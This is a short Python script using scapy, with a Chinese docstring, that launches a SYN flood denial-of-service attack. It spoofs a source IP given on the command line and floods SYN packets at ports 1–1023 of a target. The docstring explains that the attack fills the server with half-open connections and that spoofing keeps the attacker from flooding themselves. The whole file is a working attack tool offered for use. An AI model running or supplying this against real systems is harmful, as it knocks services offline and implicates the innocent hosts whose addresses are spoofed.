#!/usr/bin/env python
# coding:utf-8

"""
SYN洪水利用了tcp连接时的三次握手，让服务器开启半连接，造成dos攻击。
通常，我们都会把SYN洪水和IP欺骗一起用，要不然服务器直接把包丢给你，你就dos你自己了。
另外，两者的结合还可能造成流量拥塞，因为服务器会为每个接收到的SYN/ACK包发送RST包。
"""
import sys
from scapy.all import srflood, IP, TCP

if len(sys.argv) < 3:
    print sys.argv[0] + " <spoofed_source_ip> <target>"
    sys.exit(1)

packet = IP(src=sys.argv[1], dst=sys.argv[2]) / TCP(dport=range(1, 1024), flags="S")

srflood(packet, store=0)
